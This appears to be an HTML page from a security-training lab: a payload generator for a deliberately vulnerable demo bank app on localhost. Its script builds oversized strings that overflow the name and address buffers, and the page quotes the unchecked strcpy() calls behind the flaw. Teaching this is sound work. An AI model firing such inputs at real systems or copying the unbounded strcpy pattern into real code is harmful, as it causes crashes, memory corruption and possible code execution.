<!DOCTYPE html>
<html lang="en-GB">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Buffer Overflow Exploitation Tool - Functional Thinking Bank</title>
    <style>
        body { 
            font-family: 'Segoe UI', Arial, sans-serif; 
            margin: 0; 
            padding: 20px; 
            background: linear-gradient(135deg, #ff6b6b 0%, #ee5a52 100%);
            min-height: 100vh;
        }
        .container { 
            max-width: 900px; 
            margin: 0 auto; 
            background: white; 
            border-radius: 12px; 
            padding: 30px; 
            box-shadow: 0 15px 35px rgba(0,0,0,0.1);
        }
        .header { 
            text-align: center; 
            margin-bottom: 40px; 
            padding-bottom: 20px; 
            border-bottom: 3px solid #ff6b6b;
        }
        .header h1 { 
            color: #333; 
            margin: 0; 
            font-size: 2.2em;
        }
        .warning {
            background: #fff3cd;
            border: 2px solid #ffc107;
            border-radius: 8px;
            padding: 20px;
            margin-bottom: 30px;
            color: #856404;
        }
        .exploit-section {
            background: #f8f9fa;
            padding: 25px;
            border-radius: 8px;
            margin-bottom: 25px;
            border-left: 5px solid #ff6b6b;
        }
        .payload-box {
            background: #2d3748;
            color: #e2e8f0;
            padding: 15px;
            border-radius: 6px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            margin: 15px 0;
            overflow-x: auto;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            margin-bottom: 8px;
            font-weight: 600;
            color: #333;
        }
        input, select, textarea {
            width: 100%;
            padding: 12px;
            border: 2px solid #ddd;
            border-radius: 6px;
            font-size: 16px;
            font-family: 'Courier New', monospace;
        }
        .btn {
            background: #ff6b6b;
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 16px;
            font-weight: 600;
            margin: 5px;
        }
        .btn:hover {
            background: #ff5252;
        }
        .btn-copy {
            background: #28a745;
        }
        .btn-copy:hover {
            background: #218838;
        }
        .target-info {
            background: #e3f2fd;
            border: 1px solid #2196f3;
            border-radius: 6px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .payload-info {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 15px;
            margin-bottom: 20px;
        }
        .info-card {
            background: white;
            padding: 15px;
            border-radius: 6px;
            border: 1px solid #ddd;
        }
        .danger {
            color: #dc3545;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Buffer Overflow Exploitation Tool</h1>
            <p style="color: #666; font-style: italic;">Educational Demonstration - Functional Thinking Bank</p>
        </div>

        <div class="warning">
            <h3>Educational Use Only</h3>
            <p><strong>This tool is for security training purposes only.</strong> It demonstrates how buffer overflow vulnerabilities occur when functional thinking prioritises performance over security validation. Use only against the demonstration application.</p>
        </div>

        <div class="target-info">
            <h3>Target Vulnerability Analysis</h3>
            <p><strong>Target Function:</strong> Profile Update (strcpy vulnerability)</p>
            <p><strong>Buffer Sizes:</strong> full_name[32], address[64]</p>
            <p><strong>Vulnerability:</strong> No bounds checking on user input</p>
            <p><strong>Functional Thinking:</strong> "strcpy is faster than strncpy - optimise for performance"</p>
        </div>

        <div class="exploit-section">
            <h3>Payload Generator</h3>
            
            <div class="payload-info">
                <div class="info-card">
                    <h4>Name Buffer (32 bytes)</h4>
                    <p>Current limit: 31 characters + null terminator</p>
                    <p class="danger">Overflow at: 32+ characters</p>
                </div>
                <div class="info-card">
                    <h4>Address Buffer (64 bytes)</h4>
                    <p>Current limit: 63 characters + null terminator</p>
                    <p class="danger">Overflow at: 64+ characters</p>
                </div>
            </div>

            <div class="form-group">
                <label for="overflow_type">Exploitation Type:</label>
                <select id="overflow_type" onchange="generatePayload()">
                    <option value="name_basic">Name Buffer - Basic Overflow (40 chars)</option>
                    <option value="name_large">Name Buffer - Large Overflow (100 chars)</option>
                    <option value="address_basic">Address Buffer - Basic Overflow (80 chars)</option>
                    <option value="address_large">Address Buffer - Large Overflow (200 chars)</option>
                    <option value="both">Both Buffers - Simultaneous Overflow</option>
                </select>
            </div>

            <div class="form-group">
                <label for="payload_name">Generated Name Payload:</label>
                <textarea id="payload_name" rows="3" readonly></textarea>
                <button class="btn btn-copy" onclick="copyToClipboard('payload_name')">Copy Name Payload</button>
                <button class="btn" onclick="pasteToBank('name')">Paste to Bank App</button>
            </div>

            <div class="form-group">
                <label for="payload_address">Generated Address Payload:</label>
                <textarea id="payload_address" rows="3" readonly></textarea>
                <button class="btn btn-copy" onclick="copyToClipboard('payload_address')">Copy Address Payload</button>
                <button class="btn" onclick="pasteToBank('address')">Paste to Bank App</button>
            </div>

            <div class="payload-box">
                <strong>Payload Analysis:</strong><br>
                <span id="analysis_output">Select an exploitation type to see payload analysis</span>
            </div>
        </div>

        <div class="exploit-section">
            <h3>Exploitation Steps</h3>
            <ol>
                <li><strong>Start the vulnerable application:</strong> <code>make run</code></li>
                <li><strong>Open the bank application:</strong> <a href="http://localhost:8080" target="_blank">http://localhost:8080</a></li>
                <li><strong>Select an account</strong> to modify (e.g., ACC001)</li>
                <li><strong>Generate payload</strong> using the tool above</li>
                <li><strong>Copy and paste</strong> the malicious payload into the name or address field</li>
                <li><strong>Submit the form</strong> and observe the behaviour</li>
                <li><strong>Expected Results:</strong>
                    <ul>
                        <li>Application crash (segmentation fault)</li>
                        <li>Memory corruption</li>
                        <li>Adjacent data overwrite</li>
                        <li>Potential code execution</li>
                    </ul>
                </li>
            </ol>
        </div>

        <div class="exploit-section">
            <h3>What's Happening?</h3>
            <p><strong>Root Cause:</strong> The application uses <code>strcpy()</code> without bounds checking:</p>
            <div class="payload-box">// Vulnerable code in handleProfileUpdate()
strcpy(customer.full_name, new_name.c_str());    // 32-byte buffer
strcpy(customer.address, new_address.c_str());   // 64-byte buffer</div>
            
            <p><strong>Functional Thinking Flaw:</strong> Engineers optimised for performance by using the faster <code>strcpy()</code> instead of bounds-checked alternatives, assuming input would be reasonable.</p>
            
            <p><strong>Security Impact:</strong> Attackers can overflow these buffers to:</p>
            <ul>
                <li>Corrupt adjacent memory structures</li>
                <li>Overwrite other customer data</li>
                <li>Potentially gain code execution</li>
                <li>Cause application crashes (denial of service)</li>
            </ul>
        </div>
    </div>

    <script>
        function generatePayload() {
            const type = document.getElementById('overflow_type').value;
            let namePayload = '';
            let addressPayload = '';
            let analysis = '';

            switch(type) {
                case 'name_basic':
                    namePayload = 'A'.repeat(40) + '_OVERFLOW_MARKER';
                    addressPayload = '45 Victoria Street, London SW1H 0EU';
                    analysis = 'Name buffer overflow: 40 chars exceeds 32-byte limit by 8 bytes. Will overwrite adjacent memory.';
                    break;
                
                case 'name_large':
                    namePayload = 'AAAA'.repeat(25) + '_LARGE_OVERFLOW_' + 'B'.repeat(20);
                    addressPayload = '45 Victoria Street, London SW1H 0EU';
                    analysis = 'Large name overflow: 100+ chars significantly exceeds buffer. High chance of crash or corruption.';
                    break;
                
                case 'address_basic':
                    namePayload = 'John Smith';
                    addressPayload = 'C'.repeat(80) + '_ADDRESS_OVERFLOW_MARKER_' + 'D'.repeat(10);
                    analysis = 'Address buffer overflow: 80+ chars exceeds 64-byte limit. Will corrupt adjacent structures.';
                    break;
                
                case 'address_large':
                    namePayload = 'John Smith';
                    addressPayload = 'OVERFLOW_'.repeat(20) + '_VERY_LONG_ADDRESS_ATTACK_' + 'X'.repeat(50);
                    analysis = 'Large address overflow: 200+ chars massively exceeds buffer. Likely to cause immediate crash.';
                    break;
                
                case 'both':
                    namePayload = 'SIMULTANEOUS_ATTACK_'.repeat(3) + 'NAME_OVERFLOW';
                    addressPayload = 'DUAL_BUFFER_ATTACK_'.repeat(8) + 'ADDRESS_OVERFLOW_COMPLETE';
                    analysis = 'Simultaneous overflow: Both buffers exceeded. Maximum memory corruption potential.';
                    break;
            }

            document.getElementById('payload_name').value = namePayload;
            document.getElementById('payload_address').value = addressPayload;
            document.getElementById('analysis_output').innerHTML = 
                `Length: Name=${namePayload.length} chars, Address=${addressPayload.length} chars<br>
                 ${analysis}`;
        }

        function copyToClipboard(elementId) {
            const element = document.getElementById(elementId);
            element.select();
            document.execCommand('copy');
            alert('Payload copied to clipboard!');
        }

        function pasteToBank(type) {
            alert(`1. Open http://localhost:8080 in another tab\n2. Select an account\n3. Paste the ${type} payload into the corresponding field\n4. Submit to trigger the vulnerability`);
        }

        // Generate initial payload
        generatePayload();
    </script>
</body>
</html>